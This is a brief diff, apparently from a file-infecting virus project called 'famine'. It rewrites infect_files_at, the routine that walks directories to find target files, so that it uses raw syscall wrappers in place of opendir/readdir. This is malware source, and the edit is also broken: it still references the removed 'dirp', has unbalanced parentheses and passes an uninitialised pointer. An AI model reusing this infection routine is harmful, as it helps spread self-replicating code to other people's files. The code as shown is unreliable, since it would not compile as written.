@@ -20,13 +20,13 @@
 static void	infect_files_at(char path[PATH_MAX], char *path_end)
 {
 	struct dirent	*file;
-	DIR		*dirp = opendir(path);
+	int		fd = famine_open(path);
 
 	if (!dirp) return;
 
 	ft_strcpy(path_end++, "/");
 
-	while ((file = readdir(dirp)))
+	while (famine_getdents64(fd, file, sizeof(*file)) > 0))
 	{
 		ft_strcpy(path_end, file->d_name);
 		if (file->d_name[0] == '.') // we respect your privacy ;)
